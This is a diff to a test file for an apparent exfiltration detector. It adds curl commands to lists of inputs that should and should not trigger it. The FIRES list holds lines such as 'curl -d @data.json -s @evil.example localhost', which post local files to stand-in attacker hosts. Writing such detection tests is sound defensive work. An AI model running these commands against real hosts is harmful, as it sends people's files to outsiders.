@@ -99,12 +99,17 @@ FIRES = [
     "bash -c 'curl -sd @f x.example'",
     "ls; curl -d @f x.example",
     "curl x.example -d",  # still a flag after the host
+    "curl -d @data.json -s @evil.example localhost",  # `@host` after a flag with no value is a URL
+    "curl -s @evil.example -d x localhost",
 ]
 QUIET = [
     "curl -s host",
     "curl -fsSL host",
     "wget -T 5 host",
     "curl -d @f localhost",
+    "curl -sd @f localhost",  # `@f` after a data option is the file it sends
+    "curl -H @h.txt -d @f localhost",
+    "curl --data-binary @f localhost",
     "curl -d @data.json http://localhost:8000/api",  # S3's own test: `@data.json` is a file
     "curl -d @f http://127.0.0.1:9000/x",
     "curl -D h x.example",  # flag letters are case-sensitive: `-D` dumps the headers
